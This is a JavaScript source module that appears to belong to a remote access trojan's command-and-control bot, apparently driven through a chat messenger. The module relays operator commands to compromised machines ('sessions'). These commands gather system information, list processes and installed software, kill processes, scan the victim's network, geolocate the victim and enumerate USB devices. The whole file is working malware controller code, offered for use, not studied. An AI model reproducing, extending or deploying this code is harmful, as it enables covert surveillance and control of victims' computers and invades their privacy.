import { ResponseFormatter } from '../utils/formatter.js';

/**
 * System Information Commands Module
 */

export class SystemCommands {
  constructor(ratClient, sock) {
    this.ratClient = ratClient;
    this.sock = sock;
  }

  /**
   * System info command
   */
  async sysinfo(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    const result = await this.ratClient.getSystemInfo(sessionId);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.systemInfo(result.data) 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Process list command
   */
  async processes(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info('⚙️ Enumerating processes...\n\n_Please wait..._') 
    });

    const result = await this.ratClient.getProcesses(sessionId);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.processList(result.data) 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * System metrics command
   */
  async metrics(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    const result = await this.ratClient.getMetrics(sessionId);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.metrics(result.data) 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Installed software command
   */
  async software(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info('📦 Enumerating installed software...\n\n_This may take 30 seconds..._') 
    });

    const result = await this.ratClient.getSoftware(sessionId);
    
    if (result.success) {
      const softwareData = typeof result.data === 'string' ? result.data.split('\n') : result.data;
      const softwareList = Array.isArray(softwareData) ? softwareData.slice(0, 20) : Object.values(softwareData).slice(0, 20);
      let response = ResponseFormatter.header('📦', 'INSTALLED SOFTWARE') + '\n\n';
      
      softwareList.forEach((sw, idx) => {
        const swStr = typeof sw === 'string' ? sw : JSON.stringify(sw);
        if (swStr.trim()) {
          response += `${idx + 1}. ${swStr.trim()}\n`;
        }
      });
      
      response += '\n_Showing top 20 programs_';
      await this.sock.sendMessage(chatId, { text: response });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Kill process command
   */
  async killProcess(chatId, sessionId, pid) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    if (!pid) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error('Usage: /killproc <PID>') 
      });
      return;
    }

    const result = await this.ratClient.killProcess(sessionId, pid);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.success(`Process ${pid} terminated`) 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Network scan command
   */
  async networkScan(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info('🌐 Scanning network...\n\n_This may take 1-2 minutes..._') 
    });

    const result = await this.ratClient.networkScan(sessionId);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.networkScan(result.data) 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Geolocation command
   */
  async locate(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info('🌍 Getting geolocation...\n\n_Please wait..._') 
    });

    const result = await this.ratClient.getGeolocation(sessionId);
    
    if (result.success) {
      try {
        const location = typeof result.data === 'string' ? JSON.parse(result.data) : result.data;
        let response = ResponseFormatter.header('🌍', 'GEOLOCATION') + '\n\n';
        
        Object.keys(location).forEach(key => {
          response += `▪️ *${key}:* ${location[key]}\n`;
        });
        
        await this.sock.sendMessage(chatId, { text: response });
      } catch {
        const dataStr = typeof result.data === 'string' ? result.data : JSON.stringify(result.data);
        await this.sock.sendMessage(chatId, { 
          text: ResponseFormatter.info(dataStr) 
        });
      }
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * USB devices enumeration
   */
  async usbDevices(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info('💾 Enumerating USB devices...\n\n_Please wait..._') 
    });

    try {
      const result = await this.ratClient.enumerateUSB(sessionId);
      
      if (result.success) {
        let response = ResponseFormatter.header('💾', 'USB DEVICES') + '\n\n';
        const devices = typeof result.data === 'string' ? result.data.split('\n') : result.data;
        
        const filtered = (Array.isArray(devices) ? devices : [devices])
          .filter(d => d && d.trim())
          .slice(0, 15);
        
        if (filtered.length === 0) {
          response += 'No USB devices found';
        } else {
          filtered.forEach((device, idx) => {
            const devStr = typeof device === 'string' ? device : JSON.stringify(device);
            response += `${idx + 1}. ${devStr.trim()}\n`;
          });
        }
        
        await this.sock.sendMessage(chatId, { text: response });
      } else {
        await this.sock.sendMessage(chatId, { 
          text: ResponseFormatter.error(result.error) 
        });
      }
    } catch (error) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(`USB enumeration failed: ${error.message}`) 
      });
    }
  }
}